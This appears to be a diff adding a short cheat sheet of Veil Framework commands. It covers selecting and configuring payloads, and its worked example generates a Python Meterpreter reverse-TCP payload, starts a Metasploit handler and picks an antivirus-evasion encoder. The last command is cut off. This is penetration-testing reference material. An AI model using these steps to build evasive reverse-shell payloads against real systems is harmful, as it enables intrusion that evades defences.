@@ -1,0 +1,60 @@
+=================================
+Veil Framework - Common CLI Commands
+=================================
+
+1. Starting Veil
+-------------------
+cd /path/to/Veil/
+sudo ./Veil.py              # Start the Veil interface (legacy)
+sudo veil                   # If installed globally (Veil-Evasion 3+)
+
+2. Selecting Payload
+----------------------
+list                        # Show all available payloads
+use <payload>               # Select a payload (e.g., use python/meterpreter/rev_tcp)
+
+3. Configuring Payload
+------------------------
+set LHOST <your IP>         # Set your IP
+set LPORT <port>            # Set your listener port
+info                        # Show info on selected payload
+generate                    # Generate the payload
+back                        # Go back to main menu
+
+4. Viewing Available Payloads
+-------------------------------
+list                        # List all payloads
+info <payload>              # Show details about a specific payload
+
+5. Setting Output Options
+---------------------------
+set output_name <name>      # Name of generated file
+set output_base <directory> # Directory to save output
+
+6. Starting Metasploit Handler
+--------------------------------
+- Veil may generate an RC file
+msfconsole -r handler.rc    # Start listener with proper settings
+
+7. Example: Generate Python Meterpreter Payload
+-------------------------------------------------
+use python/meterpreter/rev_tcp
+set LHOST 192.168.1.10
+set LPORT 4444
+generate
+
+8. Antivirus Evasion Options
+-----------------------------
+- Choose encoding when prompted (x86/shikata_ga_nai)
+- Optional obfuscation methods may be prompted
+
+9. Cleaning Old Builds
+-------------------------
+rm -rf /var/lib/veil/output/compiled/*
+rm -rf /var/lib/veil/output/source/*
+
+10. Updating Veil
+-------------------
+cd /path/to/Veil
+git pull
+sudo ./
